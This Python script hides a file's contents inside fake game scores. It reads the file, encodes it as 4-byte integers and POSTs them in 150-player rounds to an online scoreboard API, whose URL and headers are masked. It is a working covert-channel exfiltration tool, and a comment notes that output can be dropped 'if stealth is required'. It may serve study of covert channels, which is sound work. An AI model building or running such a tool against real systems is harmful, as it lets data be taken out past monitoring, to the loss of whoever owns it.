import requests
import json
import sys
import time

# start timer
tic = time.perf_counter()

# arg1 = file to send
fileName = sys.argv[1]
# arg2 = URL code
URLcode = sys.argv[2]
# number of bytes per chunk
bytes_per_score = 4

# open a file and convert to binary
try:
    file = open(fileName, "rb")
    message = file.read()
    dataSize = str(len(message))
    file.close()
except:
    sys.exit("Error opening file, please check your file name")

# build the url from the prefix and the unique code as an arg
scoreBoard = '**************' + URLcode

# send a get request to the site so we can get out starting point, player0
resp = requests.get(scoreBoard)
if(resp.status_code != 200):
        sys.exit('GET request failed')
# sift through the json data to find player0
info = json.loads(resp.text)
info = next(item for item in info['players'] if item["player_name"] == "0")
player0 = info['id']

# encode the message
# Pad message so it is divisable into multi-byte chunks
if (len(message) % bytes_per_score  != 0):
    for i in range(bytes_per_score - (len(message) % bytes_per_score)):
        message += b' '

# group into multi-byte chunks
chunks = []
for i in range(0, len(message), bytes_per_score):
    try:
        chunks.append(format(message[i], '08b') + format(message[i+1], '08b') 
                  + format(message[i+2], '08b') + format(message[i+3], '08b'))
    # if there is an encoding error, the file might still be salvagable, continue
    except:
        print("error during encoding!")
        pass

# translate chunks into decimal
decimalMessage = []
for chunk in chunks:
    decimalMessage.append(int(chunk, 2))

# further pad the message with 0's if not divisable by 150
# this is to ensure it fits into one round with 150 players
paddingLength = 150 - (len(decimalMessage) % 150)
for i in range(paddingLength):
    decimalMessage.append(0)
rounds = str(int(len(decimalMessage) / 150))

print("Uploading...")

# group the message so that it can be displayed in 'rounds' of 150 players
for i in range(0, len(decimalMessage), 150):
    # populate a dict with player id's and scores
    scoreRound = {"scores": [], "comment" : " "}

    # starting with player0, add in each part of the message sequentially
    for x in range(150):
        scoreRound['scores'].append({'player' : (player0 + x), 'score' : int(decimalMessage[i])})
        i += 1

    # POST the json string (converted from the dict) to the scoreboard
    scores = json.dumps(scoreRound)
    headers = headers = {'**********': '************',}
    resp = requests.post((scoreBoard + '*********'), headers = headers, data = scores)
    if(resp.status_code != 201):
        sys.exit('File failed to post to website')

# stop timer
toc = time.perf_counter()
workTime = str(round((toc - tic), 2))

# print completion message, leave out print functions if stealth is required
print(dataSize + " bytes converted to " + rounds + 
                 " rounds of online scores in " + workTime + " seconds.")
